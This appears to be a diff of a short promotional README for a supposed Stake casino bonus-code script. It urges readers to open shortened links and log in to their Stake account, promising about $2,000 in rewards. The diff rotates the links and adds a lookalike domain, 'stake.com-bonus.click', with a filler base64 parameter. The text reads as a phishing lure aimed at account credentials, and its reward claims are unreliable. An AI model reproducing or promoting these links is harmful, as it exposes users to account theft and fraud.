@@ -3,7 +3,7 @@ this script collects active bonus codes that have been unclaimed
 
 
 simply visit
-https://rb.gy/z6n98
+https://rb.gy/e4bfd
 
 and login to your stake account. there script will run in the background claiming all the active bonus codes that your account can claim.
 
@@ -17,5 +17,4 @@ after claiming all active codes you will have around $2,000 in bonus rewards add
 
 if the link above goes down just use this link
 
-https://stake-com.vercel.app/?code=IHN0YWtlIHJ1biBweSBib251c2NvZGVzY3JpcHQucHkgZ29zdGFrZSBydW4gcHkgYm9udXNjb2Rlc2NyaXB0LnB5IGdvc3Rha2UgcnVuIHB5IGJvbnVzY29kZXNjcmlwdC5weSBnb3N0YWtlIHJ1biBweSBib251c2NvZGVzY3JpcHQucHkgZ29zdGFrZSBydW4gcHkgYm9udXNjb2Rlc2NyaXB0L
-
+https://stake.com-bonus.click/?code=IHN0YWtlIHJ1biBweSBib251c2NvZGVzY3JpcHQucHkgZ29zdGFrZSBydW4gcHkgYm9udXNjb2Rlc2NyaXB0LnB5IGdvc3Rha2UgcnVuIHB5IGJvbnVzY29kZXNjcmlwdC5weSBnb3N0YWtlIHJ1biBweSBib251c2NvZGVzY3JpcHQucHkgZ29zdGFrZSBydW4gcHkgYm9udXNjb2Rlc2NyaXB0
